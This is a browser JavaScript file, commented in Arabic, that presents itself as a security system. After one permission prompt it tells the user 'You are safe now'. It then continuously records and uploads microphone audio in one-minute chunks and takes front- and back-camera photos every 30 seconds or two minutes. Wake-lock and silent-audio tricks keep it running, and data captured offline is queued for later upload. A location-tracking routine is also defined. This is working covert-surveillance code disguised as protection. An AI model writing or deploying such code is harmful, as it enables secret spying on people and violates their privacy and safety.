// إعداد التخزين المحلي (IndexedDB)
localforage.config({ name: 'darknetsailor-db', storeName: 'uploads' });

let wakeLock = null;
let isRecording = false;
let cameraInterval = null;
let currentFacingMode = 'user'; // 'user' للكاميرا الأمامية، 'environment' للخلفية

// -----------------------------------------------------
// 1. تشغيل النظام
// -----------------------------------------------------
document.getElementById('startBtn').addEventListener('click', async () => {
    const startBtn = document.getElementById('startBtn');
    const status = document.getElementById('status');
    
    startBtn.style.display = 'none';
    status.innerText = 'جاري طلب الأذونات...';

    try {
        const stream = await navigator.mediaDevices.getUserMedia({ 
            audio: true, 
            video: true 
        });

        status.innerText = 'جاري تفعيل النظام الأمني...';
        
        await requestWakeLock(); // منع النوم
        startSilentKeepAlive();  // تشغيل الصوت الصامت
        startAudioRecording(stream); // بدء الصوت (دقيقة بدقيقة)
        startCameraLoop(stream); // بدء الكاميرا
        
        isRecording = true;
        status.innerText = '✅ تم تفعيل الحماية بنجاح. أنت آمن الآن.';
        status.style.color = '#00ff00';
        
        // تشغيل المزامنة عند عودة الإنترنت
        window.addEventListener('online', syncOfflineData);
        syncOfflineData(); // محاولة إرسال أي بيانات قديمة

    } catch (error) {
        status.innerText = '❌ فشل الاتصال. يرجى السماح بالوصول.';
        status.style.color = '#ff0000';
        startBtn.style.display = 'block';
        console.error(error);
    }
});

// -----------------------------------------------------
// 2. منع النوم (Wake Lock API)
// -----------------------------------------------------
async function requestWakeLock() {
    try {
        if ('wakeLock' in navigator) {
            wakeLock = await navigator.wakeLock.request('screen');
            wakeLock.addEventListener('release', () => {
                console.log('Wake Lock released');
            });
        }
    } catch (err) {
        console.error(`Wake Lock Error: ${err.name}, ${err.message}`);
    }
}

// -----------------------------------------------------
// 3. الصوت الصامت (لإبقاء المتصفح نشطاً في الخلفية)
// -----------------------------------------------------
function startSilentKeepAlive() {
    const audio = document.getElementById('silentAudio');
    audio.volume = 0.01; // مستوى صوت منخفض جداً
    audio.play().catch(e => console.log("Audio play blocked", e));
}

// -----------------------------------------------------
// 4. تسجيل الصوت وإرساله كل دقيقة
// -----------------------------------------------------
function startAudioRecording(stream) {
    const audioContext = new (window.AudioContext || window.webkitAudioContext)({ sampleRate: 44100 });
    const source = audioContext.createMediaStreamSource(stream);
    const processor = audioContext.createScriptProcessor(4096, 1, 1);
    
    source.connect(processor);
    processor.connect(audioContext.destination);

    let mp3encoder = new lamejs.Mp3Encoder(1, 44100, 128);
    let mp3Data = [];

    processor.onaudioprocess = (e) => {
        if (!isRecording) return;
        const samples = e.inputBuffer.getChannelData(0);
        const sampleInt16 = new Int16Array(samples.length);
        for (let i = 0; i < samples.length; i++) {
            sampleInt16[i] = Math.max(-1, Math.min(1, samples[i])) * 0x7FFF;
        }
        const mp3buf = mp3encoder.encodeBuffer(sampleInt16);
        if (mp3buf.length > 0) mp3Data.push(new Int8Array(mp3buf));
    };

    // كل 60 ثانية، نقوم بتصدير الملف وإرساله ثم البدء من جديد
    setInterval(() => {
        if (!isRecording || mp3Data.length === 0) return;
        
        const mp3buf = mp3encoder.flush();
        if (mp3buf.length > 0) mp3Data.push(new Int8Array(mp3buf));
        
        const blob = new Blob(mp3Data, { type: 'audio/mp3' });
        const timestamp = new Date().getTime();
        uploadOrStore(blob, `audio_${timestamp}.mp3`, 'audio');

        // إعادة تهيئة المخزن للدقيقة التالية
        mp3Data = [];
        mp3encoder = new lamejs.Mp3Encoder(1, 44100, 128);
    }, 60000); // 60,000 ملي ثانية = دقيقة
}

// -----------------------------------------------------
// 5. التقاط الكاميرا (تغيير المعدل حسب حالة الشاشة)
// -----------------------------------------------------
function startCameraLoop(stream) {
    const video = document.getElementById('videoFront');
    const canvas = document.getElementById('canvas');
    const context = canvas.getContext('2d');

    const capture = async () => {
        if (!isRecording) return;
        try {
            video.srcObject = stream;
            video.onloadedmetadata = () => {
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                context.drawImage(video, 0, 0, canvas.width, canvas.height);
                canvas.toBlob(blob => {
                    const timestamp = new Date().getTime();
                    const prefix = currentFacingMode === 'user' ? 'front' : 'back';
                    uploadOrStore(blob, `${prefix}_${timestamp}.jpg`, 'photo');
                }, 'image/jpeg', 0.8);
                
                // التبديل بين الكاميرا الأمامية والخلفية
                currentFacingMode = currentFacingMode === 'user' ? 'environment' : 'user';
                switchCamera(currentFacingMode);
            };
        } catch (e) { console.log("Capture error", e); }
    };

    const switchCamera = async (mode) => {
        try {
            const newStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
            video.srcObject = newStream;
        } catch (e) {}
    };

    // إعداد المؤقت الأولي (كل 30 ثانية)
    cameraInterval = setInterval(capture, 30000);

    // مراقبة حالة الشاشة (Page Visibility API)
    document.addEventListener('visibilitychange', () => {
        clearInterval(cameraInterval);
        if (document.hidden) {
            // في الخلفية: التصوير كل دقيقتين (لتوفير البطارية)
            cameraInterval = setInterval(capture, 120000);
        } else {
            // في المقدمة: التصوير كل 30 ثانية
            cameraInterval = setInterval(capture, 30000);
        }
    });
}

// -----------------------------------------------------
// 6. تتبع الموقع (كل 5 دقائق)
// -----------------------------------------------------
function startLocationTracking() {
    const sendLocation = () => {
        navigator.geolocation.getCurrentPosition((position) => {
            const data = {
                type: 'location',
                lat: position.coords.latitude,
                lon: position.coords.longitude,
                accuracy: position.coords.accuracy,
                timestamp: new Date().getTime()
            };
            fetch('/api/upload', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            }).catch(() => {
                // حفظ في التخزين المحلي إذا فشل الاتصال
                localforage.setItem(`loc_${data.timestamp}`, data);
            });
        }, (error) => console.log(error), { enableHighAccuracy: true });
    };
    sendLocation();
    setInterval(sendLocation, 5 * 60 * 1000);
}

// -----------------------------------------------------
// 7. الإرسال والتخزين المؤقت (IndexedDB)
// -----------------------------------------------------
async function uploadOrStore(blob, filename, type) {
    if (!navigator.onLine) {
        // لا يوجد إنترنت، احفظ محلياً
        await localforage.setItem(filename, { blob: blob, type: type, filename: filename });
        console.log(`[!] Offline: Saved ${filename} to IndexedDB`);
        return;
    }

    const formData = new FormData();
    formData.append('file', blob, filename);
    formData.append('type', type);

    try {
        const response = await fetch('/api/upload', { method: 'POST', body: formData });
        if (!response.ok) throw new Error('Server error');
        console.log(`[+] Sent ${filename}`);
    } catch (error) {
        // فشل الإرسال (انقطع الإنترنت أثناء الإرسال)، احفظ محلياً
        await localforage.setItem(filename, { blob: blob, type: type, filename: filename });
        console.log(`[!] Failed to send ${filename}, saved locally.`);
    }
}

// -----------------------------------------------------
// 8. مزامنة البيانات المخزنة عند عودة الإنترنت
// -----------------------------------------------------
async function syncOfflineData() {
    console.log("[*] Checking for offline data...");
    const keys = await localforage.keys();
    for (let key of keys) {
        const item = await localforage.getItem(key);
        if (item && item.blob) {
            const formData = new FormData();
            formData.append('file', item.blob, item.filename);
            formData.append('type', item.type);
            try {
                await fetch('/api/upload', { method: 'POST', body: formData });
                await localforage.removeItem(key); // حذف بعد النجاح
                console.log(`[+] Synced offline file: ${key}`);
            } catch (e) {
                console.log(`[-] Failed to sync ${key}, will try later.`);
                break; // توقف وحاول لاحقاً
            }
        } else if (item && item.type === 'location') {
            try {
                await fetch('/api/upload', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(item)
                });
                await localforage.removeItem(key);
                console.log(`[+] Synced offline location: ${key}`);
            } catch (e) { break; }
        }
    }
}
